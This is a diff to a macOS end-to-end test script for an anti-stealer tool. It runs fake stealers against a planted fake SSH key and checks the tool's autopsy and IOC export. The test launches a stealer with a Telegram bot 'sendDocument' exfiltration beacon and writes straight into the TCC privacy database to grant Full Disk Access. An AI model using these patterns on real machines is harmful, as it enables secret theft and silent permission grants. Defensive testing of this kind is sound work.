@@ -2,8 +2,9 @@
 # End-to-end test of ABA on macOS, in the spirit of scripts/e2e-linux.sh:
 # install as a launchd daemon, Full Disk Access, fake stealers frozen, kill, a
 # tool let through, resume, trust, release, a sweep, a hard-link trick, a copy
-# made through Finder, Strict mode's isolation, uninstall, and a check that
-# nothing is left behind.
+# made through Finder, the autopsy of a stealer that read a real key before
+# the bait and of one that didn't, Strict mode's isolation, uninstall, and a
+# check that nothing is left behind.
 #
 #   scripts/e2e-macos.sh <aba binary> <grabber binary>
 #
@@ -135,6 +136,13 @@ sw_vers | sed 's/^/      /'
 sudo sqlite3 "$TCCDB" "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, flags, last_modified) VALUES ('kTCCServiceSystemPolicyAllFiles', '$LABEL', 0, 2, 4, 1, 'UNUSED', 0, CAST(strftime('%s','now') AS INTEGER));" \
   || fail "couldn't write the privacy database"
 ok "Full Disk Access granted ahead of the install, in the privacy database"
+
+# A real-looking secret for the flight recorder to watch: a private key of
+# this user's, there since before the install (fake, made for this test).
+REALKEY="$HOME/.ssh/id_e2e_real"
+mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"
+[ -e "$REALKEY" ] && fail "$REALKEY exists already"
+printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nnot a real key: ABA end-to-end test\n-----END OPENSSH PRIVATE KEY-----\n' > "$REALKEY"; chmod 600 "$REALKEY"
 
 # =====================================================================
 say "Install"
@@ -332,6 +340,57 @@ else
 fi
 
 # =====================================================================
+say "The autopsy: a stealer that read a real key before the bait"
+# The answer has to be "it read your real SSH keys", with the time, the
+# evidence saved, the bot token in its memory found, and a shareable file.
+TOKEN="7134567890:AAHk3n2Lq9xZr8Yv6Tt5Ww4Uu3Ss2Rr1Qq0"
+for n in a b; do
+  cp "$GRABBER" "$HOME/Downloads/stealer-$n"; echo "stealer $n" >> "$HOME/Downloads/stealer-$n"
+  codesign --force -s - "$HOME/Downloads/stealer-$n" 2>/dev/null; chmod 755 "$HOME/Downloads/stealer-$n"
+done
+# autopsied ID: the alert ID once its autopsy has finished (within 30 s).
+autopsied() { wait_alert ".id == \"$1\" and ((.autopsy.finished // \"0001\") | startswith(\"0001\") | not)"; }
+pid=$(launch "$HOME/Downloads/stealer-a" -wait 1000 -beacon "https://api.telegram.org/bot$TOKEN/sendDocument" -out "$OUT/a1" "$REALKEY" "$EXODUS")
+id=$(expect_frozen "$pid" "$OUT/a1" "a stealer that read a real key first") || exit 1
+has_line "^READ $REALKEY" "$OUT/a1" || fail "the fake stealer didn't read the real-looking key: $(cat "$OUT/a1")"
+a=$(autopsied "$id") || fail "no finished autopsy for $id within 30 s: $(alerts | jq -c ".[] | select(.id==\"$id\") | .autopsy")"
+[ "$(field "$a" .autopsy.answer)" = read ] || fail "the autopsy says $(field "$a" .autopsy.answer): $(field "$a" .autopsy.headline) $(field "$a" '.autopsy.unsure | tostring')"
+field "$a" '[.autopsy.reads[]?.path] | join(" ")' | grep -q id_e2e_real || fail "the real key isn't among what it read: $(field "$a" '.autopsy.reads | tostring')"
+ok "$(field "$a" .autopsy.headline)"
+note "$(field "$a" '.autopsy.summary[0]')"
+field "$a" '.autopsy.steps[0]' | grep -qi "ssh" || fail "the first thing to do isn't about the SSH keys: $(field "$a" '.autopsy.steps | tostring')"
+field "$a" '[.autopsy.addresses[]? | select(.kind=="telegram-bot") | .value] | join(" ")' | grep -q "$TOKEN" \
+  || fail "the bot token in its memory wasn't found: $(field "$a" '{scanned: .autopsy.memoryScanned, notes: .autopsy.notes} | tostring')"
+ok "the Telegram bot token in its memory was found ($(field "$a" .autopsy.memoryScanned) bytes looked through)"
+EV="$DATA/evidence/$id"
+sudo test -f "$EV/README.txt" && sudo test -f "$EV/autopsy.json" || fail "no evidence folder: $(sudo ls -la "$EV" 2>&1)"
+sudo sh -c "ls '$EV/program/'*.sample" >/dev/null 2>&1 || fail "no copy of the program in the evidence"
+check "the evidence is root's alone" test "$(sudo stat -f '%Su %Lp' "$EV")" = "root 700"
+[ "$(field "$a" .autopsy.memoryImage)" = true ] && note "with a copy of its memory ($(sudo du -sh "$EV/memory" | cut -f1))"
+sudo aba autopsy "$id" > "$OUT/autopsy.txt" 2>&1 || { cat "$OUT/autopsy.txt"; fail "aba autopsy"; }
+sed 's/^/      /' "$OUT/autopsy.txt" | head -40
+grep -q "SSH keys" "$OUT/autopsy.txt" || fail "aba autopsy doesn't name the SSH keys"
+sudo aba export-ioc "$id" -o "$OUT/ioc.json" || fail "aba export-ioc"
+jq -e --arg t "$TOKEN" '(.file.sha256 | length) == 64 and ([.sendingTo[]?.value] | index($t)) != null' "$OUT/ioc.json" >/dev/null || fail "export-ioc: $(cat "$OUT/ioc.json")"
+grep -q "$HOME" "$OUT/ioc.json" && fail "the shareable file names the home folder: $(cat "$OUT/ioc.json")"
+grep -q "BEGIN OPENSSH" "$OUT/ioc.json" && fail "the shareable file holds the key"
+ok "export-ioc: the program's fingerprint and the bot token, nothing of yours"
+sudo aba kill "$id" >/dev/null || fail "aba kill"
+check "the evidence is still there after aba kill" sudo test -f "$EV/autopsy.json"
+
+say "The autopsy: a stealer that only touched the bait"
+pid=$(launch "$HOME/Downloads/stealer-b" -wait 1000 -out "$OUT/b1" "$EXODUS")
+id=$(expect_frozen "$pid" "$OUT/b1" "a stealer that read only the bait") || exit 1
+a=$(autopsied "$id") || fail "no finished autopsy for $id within 30 s"
+[ "$(field "$a" .autopsy.answer)" = no-sign ] || fail "the autopsy says $(field "$a" .autopsy.answer), want no-sign: $(field "$a" .autopsy.headline) $(field "$a" '.autopsy.unsure | tostring')"
+field "$a" .autopsy.headline | grep -q "^No sign it read anything real" || fail "headline: $(field "$a" .autopsy.headline)"
+[ "$(field "$a" '[.autopsy.watched[]? | select(.store=="ssh" and .watched)] | length')" = 1 ] || fail "the SSH keys weren't watched the whole time: $(field "$a" '.autopsy.watched | tostring')"
+ok "$(field "$a" .autopsy.headline)"
+note "$(field "$a" '.autopsy.summary[0]')"
+sudo aba kill "$id" >/dev/null || fail "aba kill"
+rm -f "$HOME/Downloads/stealer-a" "$HOME/Downloads/stealer-b"
+
+# =====================================================================
 say "Strict mode: the whole Mac is cut off, and given back"
 r=$(reloads)
 sudo sh -c "jq '.responses.critical = [\"freeze\",\"block-program\",\"isolate\"]' '$DATA/config.json' > '$DATA/config.new' && mv '$DATA/config.new' '$DATA/config.json'"
@@ -363,4 +422,6 @@ check "no aba on the PATH" test ! -e /usr/local/bin/aba
 for f in "${BAIT_FILES[@]}"; do [ -e "$f" ] && fail "bait left behind: $f"; done
 ok "every bait is gone (${#BAIT_FILES[@]} files)"
 check "no pf rules" test -z "$(sudo pfctl -a "$ANCHOR" -s rules 2>/dev/null)"
+check "the real-looking key was left as it was" grep -q "not a real key" "$REALKEY"
+rm -f "$REALKEY"
 say "All good"
